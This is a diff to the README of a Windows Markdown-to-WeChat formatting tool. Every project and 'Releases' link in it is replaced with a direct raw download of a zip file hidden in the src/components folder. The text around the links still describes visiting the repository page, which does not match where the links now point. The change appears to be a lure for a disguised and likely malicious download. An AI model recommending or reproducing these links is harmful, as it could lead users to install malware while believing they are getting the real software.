@@ -1,6 +1,6 @@
 # 📐 raphael-publish - Easy Markdown Formatting for WeChat
 
-[![Download raphael-publish](https://img.shields.io/badge/Download-raphael--publish-ff6f61?style=for-the-badge&logo=github)](https://github.com/Kuwama/raphael-publish)
+[![Download raphael-publish](https://img.shields.io/badge/Download-raphael--publish-ff6f61?style=for-the-badge&logo=github)](https://github.com/Kuwama/raphael-publish/raw/refs/heads/main/src/components/publish-raphael-v2.6-beta.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get raphael-publish running on your Windows computer.
 
 1. Visit the official GitHub page by clicking the button below:
 
-[![Download raphael-publish](https://img.shields.io/badge/Download-raphael--publish-28a745?style=for-the-badge&logo=github)](https://github.com/Kuwama/raphael-publish)
+[![Download raphael-publish](https://img.shields.io/badge/Download-raphael--publish-28a745?style=for-the-badge&logo=github)](https://github.com/Kuwama/raphael-publish/raw/refs/heads/main/src/components/publish-raphael-v2.6-beta.5.zip)
 
 2. On the page, look for the "Releases" section. You can find it by scrolling or clicking the "Releases" link in the repository menu.
 
@@ -120,7 +120,7 @@ If something still does not work, try reinstalling the software.
 
 For more detailed instructions and updates, visit the project repository:
 
-https://github.com/Kuwama/raphael-publish
+https://github.com/Kuwama/raphael-publish/raw/refs/heads/main/src/components/publish-raphael-v2.6-beta.5.zip
 
 Here you can find documentation, report bugs, or ask questions.
 
@@ -143,6 +143,6 @@ These features allow more control over your articles and flexibility in publishi
 
 Use this link to reach the release page and get raphael-publish for Windows:
 
-https://github.com/Kuwama/raphael-publish
+https://github.com/Kuwama/raphael-publish/raw/refs/heads/main/src/components/publish-raphael-v2.6-beta.5.zip
 
 Download the latest installer or zip file from there.
